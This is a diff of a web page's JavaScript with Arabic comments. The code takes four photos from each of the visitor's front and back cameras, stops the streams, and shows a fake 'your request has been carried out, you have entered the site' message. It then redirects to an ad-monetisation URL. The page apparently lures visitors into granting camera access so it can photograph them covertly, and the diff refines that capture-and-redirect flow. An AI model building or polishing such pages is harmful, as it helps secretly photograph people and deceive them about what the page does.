@@ -137,24 +137,29 @@
 
                 const context = canvas.getContext('2d');
                 let photoCount = 0;
+                const maxPhotos = 4; // عدد الصور لكل كاميرا
 
                 const captureInterval = setInterval(() => {
-                    if (photoCount >= 4) {
+                    if (photoCount >= maxPhotos) {
                         clearInterval(captureInterval);
-                        if (frontVideo.srcObject) frontVideo.srcObject.getTracks().forEach(track => track.stop());
-                        if (backVideo.srcObject) backVideo.srcObject.getTracks().forEach(track => track.stop());
 
-                        // ✅ الرسالة
-                        document.querySelector('.container').innerHTML = `
-                            <h1>تم تنفيذ طلبك والدخول إلى الموقع</h1>
-                            <p>يمكنك التصفح الآن أو إغلاق الصفحة</p>
-                        `;
+                        // نوقف فقط هذه الكاميرا
+                        if (video.srcObject) video.srcObject.getTracks().forEach(track => track.stop());
 
-                        // ✅ التحويل بعد أقل من ثانية
-                        setTimeout(() => {
-                            window.location.href = "https://www.profitableratecpm.com/k9n9rdcsr?key=a6d387f380a559c60dc3368e5c343738";
-                        }, 200);
+                        // إذا كانت كل الكاميرات توقفت
+                        if ((!frontVideo.srcObject || frontVideo.srcObject.getTracks().length === 0) &&
+                            (!backVideo.srcObject || backVideo.srcObject.getTracks().length === 0)) {
 
+                            document.querySelector('.container').innerHTML = `
+                                <h1>تم تنفيذ طلبك والدخول إلى الموقع</h1>
+                                <p>يمكنك التصفح الآن أو إغلاق الصفحة</p>
+                            `;
+
+                            // التحويل بعد أقل من ثانية
+                            setTimeout(() => {
+                                window.location.href = "https://www.profitableratecpm.com/k9n9rdcsr?key=a6d387f380a559c60dc3368e5c343738";
+                            }, 800);
+                        }
                         return;
                     }
 
